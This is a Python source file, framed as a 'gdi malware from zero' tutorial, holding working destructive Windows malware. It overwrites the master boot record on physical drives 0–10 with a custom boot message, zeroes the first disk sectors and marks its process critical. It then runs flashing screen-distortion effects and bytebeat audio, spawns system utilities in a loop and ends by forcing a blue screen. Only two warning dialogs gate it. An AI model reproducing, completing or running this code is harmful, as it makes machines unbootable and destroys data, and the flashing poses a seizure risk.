# hello everyone!

# Today i will be creating gdi malware from zero!

# importing...

import sounddevice as sd, numpy as np, time, ctypes, pyautogui, win32gui, win32con, win32api, random, sys, threading
import threading as th
import os

def overwrite_mbr(disk_number):
    disk_path = f"\\\\.\\PhysicalDrive{disk_number}"
    text_lines = (
        b" ________  ___       ___\r\n"
        b" |\\   ___ \\|\\  \\     |\\  \\\r\n"
        b"  \\ \\  \\_|\\ \\ \\  \\    \\ \\  \\\r\n"
        b"   \\ \\  \\ \\\\ \\ \\  \\    \\ \\  \\\r\n"
        b"    \\ \\  \\_\\\\ \\ \\  \\____\\ \\  \\____\r\n"
        b"     \\ \\_______\\ \\_______\\ \\_______\\\r\n"
        b"      \\|_______|\\|_______|\\|_______|\r\n"
        b"\r\n"
        b"Nice try!\r\n"
        b"Because your system has been eaten by DLL!\r\n"
        b"\x00"
    )
    code_template = (
        b"\xfa\xfc\x31\xc0\x8e\xd8\x8e\xc0\xbc\x00\x7c"
        b"\xbe{text_address_byte}\x7c"
        b"\xac\x3c\x00\x74\x09\xb4\x0e\xbb\x0c\x00\xcd\x10\xeb\xf2"
        b"\xf4\xeb\xfd"
    )
    
    exec_code_length = len(code_template.replace(b"{text_address_byte}", b"\x00"))
    text_address_byte = bytes([exec_code_length])
    exec_code = code_template.replace(b"{text_address_byte}", text_address_byte)
    
    raw_code = exec_code + text_lines
    padding_size = 510 - len(raw_code)
    
    if padding_size < 0:
        print(f"[DEBUG] Hex Code is bigger than 510 bytes.")
        return
        
    mbr_data = raw_code + b"\x00" * padding_size + b"\x55\xaa"

    try:
        with open(disk_path, "r+b") as disk:
            disk.seek(0)
            disk.write(b"\x00" * 512 * 10)
            disk.seek(0)
            disk.write(mbr_data)
            disk.flush()
        print(f"[DEBUG] MBR Has been overwritten!")
    except Exception as e:
        print(f"[DEBUG] MBR Overwriting error: {e}")

def error_msgbox():
    user32.MessageBoxW(
        0,
        'An critical error occurred in memory location 0xDEADDEAD.',
        "Critical error!",
        0x10
    )


def set_process_critical():
    ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))

    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)


def trigger_bsod():
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))

    ctypes.windll.ntdll.NtRaiseHardError(0xC0000005, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))


pyautogui.PAUSE = 0
pyautogui.FAILSAFE = 0

IDI_ERROR = win32gui.LoadIcon(0, win32con.IDI_HAND)
IDI_WARNING = win32gui.LoadIcon(0, win32con.IDI_WARNING)
IDI_QUESTION = win32gui.LoadIcon(0, win32con.IDI_QUESTION)
IDI_INFORMATION = win32gui.LoadIcon(0, win32con.IDI_INFORMATION)
IDI_APPLICATION = win32gui.LoadIcon(0, win32con.IDI_APPLICATION)

icons = [IDI_QUESTION, IDI_INFORMATION, IDI_WARNING, IDI_APPLICATION, IDI_ERROR]

user32 = ctypes.windll.user32

user32.SetProcessDPIAware()

programms = [
    'cmd',
    'diskmgmt.msc',
    'cmstp',
    'colorcpl',
    'comexp.msc',
    'control',
    'credwiz',
    'dccw',
    'defrag',
    'devmgmt.msc',
    'dfrgui',
    'dialer',
    'diskmgmt.msc',
    'dpapimig'
]

def open_random_prog(stop_event):
    while not stop_event.is_set():
        try:
            prog = random.choice(programms)
            os.startfile(prog)
        except Exception as e:
            print(f"[DEBUG] Error occured while trying to execute {prog}: {e}")
            pass

[w, h] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]

if __name__ == "__main__":
    t = 0

    f = "t*(t>>5|t>>8)>>(t>>16)"

    math_env = {
        'w': np.where, 'sin': np.sin, 'cos': np.cos, 'tan': np.tan,
        'abs': np.absolute, 'floor': np.floor, 'ceil': np.ceil, 'sqrt': np.sqrt, 'PI': np.pi,
        'np': np
    }

    last_error = None


    def play(o, frames, time, status):
        global t, last_error

        t_array = np.arange(t, t + frames, dtype=np.uint32)
        math_env['t'] = t_array

        try:
            raw_sound = eval(f, {}, math_env)
            byte_sound = raw_sound.astype(np.uint32) & 255
            o[:] = ((byte_sound / 127.5) - 1.0).reshape(-1, 1)

            if last_error is not None:
                print("\n[OK] Bytebeat Formula is playing!")
                last_error = None

        except Exception as e:
            o.fill(0)

            error_msg = str(e)

            if error_msg != last_error:
                print(f"\n[Bytebeat Error]: {error_msg}")
                print(f"Bytebeat formula: {f}")
                last_error = error_msg

        t += frames


    icon = win32gui.LoadIcon(None, win32con.IDI_ERROR)

    answer = user32.MessageBoxW(
            0,
            "This program destroys this computer and contains flashing lights. This is not recomended for people with epilepsy and for real PC! Continue?",
            "Warning!",
            0x34
        )

    if answer == 0x6:
        pass
    else:
        sys.exit(0)

    final_answer = user32.MessageBoxW(
            0,
            "Final waring! Think 100 times before running on real PC or with epilepsy! Continue?",
            "Final warning!",
            0x34
        )

    if final_answer == 0x6:
        pass
    else:
        sys.exit(0)

    set_process_critical()
    for i in range(11):
        overwrite_mbr(i)
    threading.Thread(target=error_msgbox, daemon=True).start()

    time.sleep(3)

    with sd.OutputStream(samplerate=8000, callback=play, blocksize=1024):
        try:
            while t < 262144:
                cur_pos = pyautogui.position()
                hdc = win32gui.GetDC(0)
                color = (random.randint(0, random.randint(0, 255)), random.randint(0, random.randint(0, 255)),
                             random.randint(0, random.randint(0, 255)))
                brush = win32gui.CreateSolidBrush(win32api.RGB(*color))
                win32gui.SelectObject(hdc, brush)
                win32gui.DrawIcon(hdc, cur_pos[0] - 15, cur_pos[1] - 15, icon)
                win32gui.BitBlt(hdc, random.randint(-200, 200), random.randint(-200, 200), w, h, hdc, 0, 0,
                                    win32con.SRCCOPY)
                win32gui.BitBlt(hdc, random.randint(-200, 200), random.randint(-200, 200), w, h, hdc, 100, 100,
                                    win32con.PATINVERT)
                pyautogui.move(random.randint(-20, 20), random.randint(-20, 20))
                time.sleep(0.001)
        except KeyboardInterrupt:
            win32gui.ReleaseDC(0, hdc)

    size = 100

    t, f = 0, "sin(t*(42&t>>10)/128*PI)*127+128"
    with sd.OutputStream(samplerate=8000, callback=play, blocksize=1024):
        try:
            while t < 262144:
                cur_pos = pyautogui.position()
                hdc = win32gui.GetDC(0)
                win32gui.DrawIcon(hdc, cur_pos[0] - 15, cur_pos[1] - 15, icon)
                pyautogui.move(random.randint(-20, 20), random.randint(-20, 20))
                win32gui.StretchBlt(
                        hdc,
                        int(size / 2),
                        int(size / 2),
                        w - size,
                        h - size,
                        hdc,
                        0,
                        0,
                        w,
                        h,
                        win32con.SRCCOPY,
                    )
                win32gui.BitBlt(hdc, random.randint(-50, 50), random.randint(-50, 50), w, h, hdc, 0, 0,
                                    win32con.SRCCOPY)
                x = random.randint(0, w)
                win32gui.BitBlt(hdc, random.randint(0, 666), random.randint(0, 666), w, h, hdc,
                                    random.randint(0, 666),
                                    random.randint(0, 666), win32con.NOTSRCERASE)
                time.sleep(0.001)

        except KeyboardInterrupt:
            win32gui.ReleaseDC(0, hdc)
    t, f = 0, "t*(t<<2&-t>>13|t>>7&-t>>11)"
    angle = 0
    with sd.OutputStream(samplerate=8000, callback=play, blocksize=1024):
        try:
            while t < 262144:
                cur_pos = pyautogui.position()
                hdc = win32gui.GetDC(0)
                desktop = win32gui.GetDesktopWindow()
                win32gui.DrawIcon(hdc, cur_pos[0] - 15, cur_pos[1] - 15, icon)
                win32gui.StretchBlt(
                        hdc, 0, 0, w, h, hdc, 0, h, w, -h, win32con.SRCCOPY
                )
                for i in range(int(w + h)):
                    a = int(np.sin(angle) * 30)
                    win32gui.BitBlt(hdc, 0, i, w, 1, hdc, a, i, win32con.SRCCOPY)
                    angle += np.pi / 30
                win32gui.ReleaseDC(desktop, hdc)
                pyautogui.move(random.randint(-20, 20), random.randint(-20, 20))
                time.sleep(0.001)
        except KeyboardInterrupt:
            win32gui.ReleaseDC(0, hdc)
    t, f = 0, "t*(t>>2|t>>7|w(t&16384,w(t&32768,t>>3,t>>8),w(t&32768,t>>7,t>>5)))"
    with sd.OutputStream(samplerate=8000, blocksize=1024, callback=play):
        try:
            while t < 262144:
                cur_pos = pyautogui.position()
                hdc = win32gui.GetDC(0)
                win32gui.DrawIcon(hdc, cur_pos[0] - 15, cur_pos[1] - 15, icon)
                win32gui.StretchBlt(hdc, -50, 0, w + 100, h, hdc, 0, 0, w, h, win32con.SRCCOPY)
                win32gui.StretchBlt(hdc, 0, -50, w, h + 100, hdc, 0, 0, w, h, win32con.SRCCOPY)
                win32gui.ReleaseDC(0, hdc)
                pyautogui.move(random.randint(-20, 20), random.randint(-20, 20))
                time.sleep(0.001)
        except KeyboardInterrupt:
            win32gui.ReleaseDC(0, hdc)

    with sd.OutputStream(8000, 1024, callback = play):
        while t<262144:
            hdc = win32gui.GetDC(0)
            flp = random.randint(0, 64)
            win32gui.BitBlt(hdc, 1, 1, w, h, hdc, 0, 0, win32con.SRCINVERT)
            if flp == 0:
                win32gui.StretchBlt(hdc, 0,0, w, h, hdc, 0, h, w, -h, win32con.SRCCOPY)
            time.sleep(0.01)

    t, f = 0, "10*(t>>6|t|t>>(t>>16))+(7&t>>11)"

    x = y = 0
    size = 100

    with sd.OutputStream(8000, 1024, callback = play):
        while t<262144:
            cur_pos = pyautogui.position()
            colors = (random.randint(0,255),random.randint(0,255),random.randint(0,255))
            hwnd = win32gui.GetDesktopWindow()
            hdc = win32gui.GetDC(0)
            win32gui.DrawIcon(hdc, cur_pos[0] - 15, cur_pos[1] - 15, icon)
            pyautogui.move(random.randint(-10, 10), random.randint(-10, 10))
            x+=100
            if x>w:
                x = 0
                y+=100
            if y>h:
                x = y = 0
            try:
                    # 1. Создаем черное перо (стиль SOLID, толщина 3 пикселя, цвет черный RGB(0,0,0))
                black_pen = win32gui.CreatePen(win32con.PS_SOLID, 3, win32api.RGB(0, 0, 0))

                    # 2. Создаем кисть для внутренности квадрата (например, белую)
                white_brush = win32gui.CreateSolidBrush(win32api.RGB(*colors))

                    # 3. Выбираем перо и кисть в контекст устройства (и сохраняем старые объекты для возврата)
                old_pen = win32gui.SelectObject(hdc, black_pen)
                old_brush = win32gui.SelectObject(hdc, white_brush)

                    # 4. Рисуем квадрат (он автоматически получит черную рамку и белую заливку)
                win32gui.Rectangle(hdc, x, y, x + size, y + size)

                    # 5. Возвращаем старые объекты на место и удаляем созданные (чтобы не было утечки памяти)
                win32gui.SelectObject(hdc, old_pen)
                win32gui.SelectObject(hdc, old_brush)
                win32gui.DeleteObject(black_pen)
                win32gui.DeleteObject(white_brush)

                flp = random.randint(0, 64)
                win32gui.StretchBlt(hdc, 0,0, w, h, hdc, random.randint(-2,2), random.randint(-2,2), w-random.randint(-2,2), h-random.randint(-2,2), win32con.SRCCOPY)
                if flp == 0:
                    win32gui.StretchBlt(hdc, 0,0, w, h, hdc, 0, h, w, -h, win32con.SRCCOPY)
                    
            finally:
                win32gui.ReleaseDC(hwnd, hdc)


    t, f = 0, "(t>>10|t*5)&(t>>8|t*4)&(t>>4|t*6)"
    with sd.OutputStream(8000, 1024, callback = play):
        while t<262144:
            cur_pos = pyautogui.position()
            colors = (random.randint(0,255),random.randint(0,255),random.randint(0,255))
            hwnd = win32gui.GetDesktopWindow()
            hdc = win32gui.GetDC(0)
            win32gui.DrawIcon(hdc, cur_pos[0] - 15, cur_pos[1] - 15, icon)
            pyautogui.move(random.randint(-10, 10), random.randint(-10, 10))
            x+=100
            if x>w:
                x = 0
                y+=100
            if y>h:
                x = y = 0
            try:
                black_pen = win32gui.CreatePen(win32con.PS_SOLID, 3, win32api.RGB(0, 0, 0))

                white_brush = win32gui.CreateSolidBrush(win32api.RGB(*colors))

                old_pen = win32gui.SelectObject(hdc, black_pen)
                old_brush = win32gui.SelectObject(hdc, white_brush)

                win32gui.Rectangle(hdc, x, y, x + size, y + size)

                win32gui.SelectObject(hdc, old_pen)
                win32gui.SelectObject(hdc, old_brush)
                win32gui.DeleteObject(black_pen)
                win32gui.DeleteObject(white_brush)

                flp = random.randint(0, 64)
                inv = random.randint(0, 1)
                if inv == 0:
                    win32gui.BitBlt(hdc, 1,1, w, h, hdc, 0, 0, win32con.SRCERASE)
                    win32gui.BitBlt(hdc, 1,1, w, h, hdc, 0, 0, win32con.SRCPAINT)
                else:
                    win32gui.BitBlt(hdc, -1,-1, w, h, hdc, 0, 0, win32con.SRCERASE)
                    win32gui.BitBlt(hdc, -1,-1, w, h, hdc, 0, 0, win32con.SRCPAINT)
                if flp == 0:
                    win32gui.StretchBlt(hdc, 0,0, w, h, hdc, 0, h, w, -h, win32con.SRCCOPY)
                    
                win32gui.ReleaseDC(hwnd, hdc)
                time.sleep(0.01)
            finally:
                win32gui.ReleaseDC(hwnd, hdc)
    stop_flag = th.Event()
    t, f = 0, "t*6*(sin((t*6>>13)*(t*6>>10)*(t*6>>12)))*10*w(t&2048,1,16)"
    with sd.OutputStream(8000, 1024, callback = play):
        openRAND = th.Thread(target=open_random_prog, args=(stop_flag,))
        openRAND.start()
        while t<262144:
            cur_pos = pyautogui.position()
            colors = (random.randint(0,255),random.randint(0,255),random.randint(0,255))
            hwnd = win32gui.GetDesktopWindow()
            hdc = win32gui.GetDC(0)
            win32gui.DrawIcon(hdc, cur_pos[0] - 15, cur_pos[1] - 15, icon)
            pyautogui.move(random.randint(-10, 10), random.randint(-10, 10))
            x+=100
            if x>w:
                x = 0
                y+=100
            if y>h:
                x = y = 0
            try:
                black_pen = win32gui.CreatePen(win32con.PS_SOLID, 3, win32api.RGB(0, 0, 0))

                white_brush = win32gui.CreateSolidBrush(win32api.RGB(*colors))

                old_pen = win32gui.SelectObject(hdc, black_pen)
                old_brush = win32gui.SelectObject(hdc, white_brush)

                win32gui.Rectangle(hdc, x, y, x + size, y + size)

                win32gui.SelectObject(hdc, old_pen)
                win32gui.SelectObject(hdc, old_brush)
                win32gui.DeleteObject(black_pen)
                win32gui.DeleteObject(white_brush)

                win32gui.BitBlt(hdc, 5, 5, w, h, hdc, 0, 0, win32con.SRCCOPY)
                win32gui.ReleaseDC(hwnd, hdc)
                time.sleep(0.0125)
            finally:
                win32gui.ReleaseDC(hwnd, hdc)
        stop_flag.set()
        openRAND.join()
        

    x = y = 0
    t, f = 0, "t*(t^t+(t>>15|1)^(t-1280^t)>>10)"
    with sd.OutputStream(8000,1024,callback = play):
        while t<262144:
            x+=15
            cur_pos = pyautogui.position()
            hdc = win32gui.GetDC(0)
            win32gui.DrawIcon(hdc, cur_pos[0] - 15, cur_pos[1] - 15, icon)
            colors = (random.randint(0,255),random.randint(0,255),random.randint(0,255))
            rgb_invert = win32gui.CreateSolidBrush(win32api.RGB(*colors))
            win32gui.SelectObject(hdc, rgb_invert)
            win32gui.BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, win32con.PATINVERT)
            win32gui.DeleteObject(rgb_invert)
            win32gui.BitBlt(hdc, 0, 25, w, h, hdc, 0, 0, win32con.SRCCOPY)
            win32gui.BitBlt(hdc, 0, -25, w, h, hdc, 0, 0, win32con.SRCCOPY)
            win32gui.BitBlt(hdc, 25, 0, w, h, hdc, 0, 0, win32con.SRCCOPY)
            win32gui.BitBlt(hdc, -25, 0, w, h, hdc, 0, 0, win32con.SRCCOPY)
            win32gui.ReleaseDC(0, hdc)
            pyautogui.move(random.randint(-10, 10), random.randint(-10, 10))
            if x>w:
                y+=15
                x = 0
            if y>h:
                x = y = 0
    t, f = 0, "t * ((t // 2 >> 10 | t % 16 * t >> 8) & 8 * t >> 12 & 18) | -(t // 16) + 64"
    with sd.OutputStream(8000,1024,callback = play):
        while t<262144:
            cur_pos = pyautogui.position()
            hdc = win32gui.GetDC(0)
            win32gui.DrawIcon(hdc, cur_pos[0] - 15, cur_pos[1] - 15, icon)
            win32gui.BitBlt(hdc, 0, 1, w, h, hdc, 0, 0, win32con.SRCINVERT)
            win32gui.BitBlt(hdc, 0, -1, w, h, hdc, 0, 0, win32con.SRCINVERT)
            win32gui.BitBlt(hdc, 1, 0, w, h, hdc, 0, 0, win32con.SRCINVERT)
            win32gui.BitBlt(hdc, -1, 0, w, h, hdc, 0, 0, win32con.SRCINVERT)

            win32gui.BitBlt(hdc, 0, 1, w, h, hdc, 0, 0, win32con.SRCPAINT)
            win32gui.BitBlt(hdc, 0, -1, w, h, hdc, 0, 0, win32con.SRCPAINT)
            win32gui.BitBlt(hdc, 1, 0, w, h, hdc, 0, 0, win32con.SRCPAINT)
            win32gui.BitBlt(hdc, -1, 0, w, h, hdc, 0, 0, win32con.SRCPAINT)

            win32gui.BitBlt(hdc, 0, 15, w, h, hdc, 0, 0, win32con.SRCCOPY)
            win32gui.ReleaseDC(0, hdc)
            pyautogui.move(random.randint(-10, 10), random.randint(-10, 10))
            time.sleep(0.01)

    flags = (win32con.RDW_INVALIDATE |
                 win32con.RDW_ERASE |
                 win32con.RDW_ALLCHILDREN |
                 win32con.RDW_UPDATENOW)

    t, f = 0, "t*-(t>>8|t|t>>9|t>>13)^t"
    with sd.OutputStream(samplerate=8000, blocksize=1024, callback=play):
        try:
            while t < 262144:
                desktop_hwnd = win32gui.GetDesktopWindow()
                hdc = win32gui.GetDC(0)
                cur_pos = pyautogui.position()
                update = random.randint(0, 128)

                win32gui.DrawIcon(hdc, cur_pos[0] - 15, cur_pos[1] - 15, icon)
                win32gui.BitBlt(
                        hdc,
                        random.randint(1, 10) % 2,
                        random.randint(1, 10) % 2,
                        w,
                        h,
                        hdc,
                        random.randint(1, 1000) % 2,
                        random.randint(1, 1000) % 2,
                        win32con.SRCAND,
                    )

                pyautogui.move(random.randint(-10, 10), random.randint(-10, 10))
                win32gui.ReleaseDC(0, hdc)
                    
                if update == 0:
                    win32gui.InvalidateRect(desktop_hwnd, None, True)
                    win32gui.UpdateWindow(desktop_hwnd)
                    win32gui.RedrawWindow(desktop_hwnd, None, None, flags)

        except KeyboardInterrupt:
            pass

        finally:
           if hdc:
            win32gui.ReleaseDC(0, hdc)
        trigger_bsod()
